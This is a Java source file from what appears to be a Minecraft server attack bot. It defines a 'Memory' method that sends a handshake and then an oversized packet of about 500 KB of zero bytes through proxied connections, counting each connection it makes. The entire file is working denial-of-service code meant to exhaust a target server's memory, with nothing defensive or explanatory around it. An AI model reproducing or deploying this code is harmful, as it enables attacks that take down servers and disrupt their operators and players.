package ml.dima_dencep.bettermcbot.methods;

import io.netty.buffer.ByteBuf;
import io.netty.buffer.ByteBufOutputStream;
import io.netty.buffer.Unpooled;
import io.netty.channel.Channel;
import java.io.IOException;

import ml.dima_dencep.bettermcbot.Main;
import ml.dima_dencep.bettermcbot.NettyBootstrap;
import ml.dima_dencep.bettermcbot.ProxyLoader;
import ml.dima_dencep.bettermcbot.minecraftutils.Handshake;

public class Memory implements Method {
   private Handshake handshake;
   private byte[] bytes;
   byte[] emptyarray;

   public Memory() {
      this.handshake = new Handshake(Main.protcolID, Main.srvRecord, Main.port, 2);
      this.bytes = this.handshake.getWrappedPacket();
      this.emptyarray = new byte[508715];
   }

   public static void writeVarInt(ByteBufOutputStream out, int paramInt) throws IOException {
      while((paramInt & -128) != 0) {
         out.writeByte(paramInt & 127 | 128);
         paramInt >>>= 7;
      }

      out.writeByte(paramInt);
   }

   public void accept(Channel channel, ProxyLoader.Proxy proxy) {
      channel.write(Unpooled.buffer().writeBytes(this.bytes));
      ByteBuf b = Unpooled.buffer();
      ByteBufOutputStream out = new ByteBufOutputStream(b);

      try {
         writeVarInt(out, 508715);
         out.write(this.emptyarray);
         out.close();
      } catch (IOException var6) {
         var6.printStackTrace();
      }

      channel.writeAndFlush(b);
      ++NettyBootstrap.integer;
      ++NettyBootstrap.totalConnections;
      channel.close();
   }
}
